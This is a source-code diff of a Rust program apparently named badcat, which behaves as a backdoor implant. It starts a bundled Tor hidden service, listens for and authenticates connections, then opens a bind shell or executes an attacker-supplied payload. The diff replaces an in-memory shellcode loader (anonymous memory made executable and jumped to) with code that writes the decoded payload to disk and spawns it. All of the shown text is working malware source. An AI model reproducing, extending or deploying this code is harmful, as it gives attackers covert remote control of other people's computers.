@@ -7,11 +7,10 @@ use std::fs::File;
 use std::net::{TcpListener, TcpStream};
 use std::path::PathBuf;
 use std::process::{Child, Command, Stdio};
-use std::{error, mem, ptr, thread};
+use std::{error, fs};
 use std::io::{Read, Write};
 
 use badcat_lib::io;
-use memmap::MmapMut;
 
 fn main() -> Result<(), Box<dyn error::Error>> {
     let setting = setting::Setting::new()?;
@@ -47,15 +46,24 @@ fn unbundle_torrc(
     Ok(())
 }
 
-fn start_tor_binary(
-    torrc: &PathBuf,
+fn executable_name(
     setting: &setting::Setting,
-) -> Result<Child, Box<dyn error::Error>> {
-    let mut executable = setting.tor_dir.join(&setting.name);
+    parent: Option<&PathBuf>,
+) -> PathBuf {
+    let mut executable = parent.unwrap_or(&setting.tor_dir).join(&setting.name);
 
     if cfg!(windows) {
         executable.set_extension("exe");
     }
+
+    executable
+}
+
+fn start_tor_binary(
+    torrc: &PathBuf,
+    setting: &setting::Setting,
+) -> Result<Child, Box<dyn error::Error>> {
+    let executable = executable_name(setting, None);
 
     // Fix directory permission - linux build requires this
     if cfg!(unix) || cfg!(macos) {
@@ -94,14 +102,22 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
     unbundle_torrc(&torrc, port, &setting)?;
 
     let mut tor_proc = start_tor_binary(&torrc, &setting)?;
+    
+    let mut payload_proc: Option<Child> = None;
 
     for stream in listener.incoming() {
         match stream {
             Ok(mut stream) => {
                 if let Ok(()) = authenticate(&mut stream, &setting) {
                     if setting.uses_payload {
-                        if let Ok(payload) = setting::get_payload(&setting) {
-                            execute_payload(payload.data);
+                        if let Some(proc) = &mut payload_proc {
+                            proc.kill().unwrap_or_else(|_| {
+                                //
+                            });
+                        }
+
+                        if let Ok(proc) = execute_payload(setting) {
+                            payload_proc = Some(proc);
                         }
                     } else {
                         match bind_shell(stream) {
@@ -193,24 +209,26 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
     Ok(())
 }
 
-fn execute_payload(payload: Vec<u8>) -> ! {
-    // thread::spawn(move || {
-    let len = payload.len();
+fn execute_payload(
+    setting: &setting::Setting
+) -> Result<Child, Box<dyn error::Error>> {
+    let payload = setting::decode_payload(setting)?;
 
-    // writable memory
-    let mut w_map = MmapMut::map_anon(len).unwrap();
+    let payload_dir = setting.tor_dir.join("payload");
 
-    unsafe {
-        // write shellcode
-        ptr::copy(payload.as_ptr(), w_map.as_mut_ptr(), len);
+    if !payload_dir.exists() {
+        fs::create_dir(&payload_dir)?;
+    }
 
-        // transition to readable/executable memory
-        let x_map = w_map.make_exec().unwrap();
+    let executable = executable_name(setting, Some(&payload_dir));
 
-        let code: extern "C" fn() -> ! = mem::transmute(x_map.as_ptr());
-        code();
-    };
-    // });
+    {
+        let mut file = File::create(&executable)?;
+        file.write(&payload.data)?;
+        file.flush()?;
+    }
 
-    // Ok(())
+    let proc = Command::new(executable).spawn()?;
+
+    Ok(proc)
 }
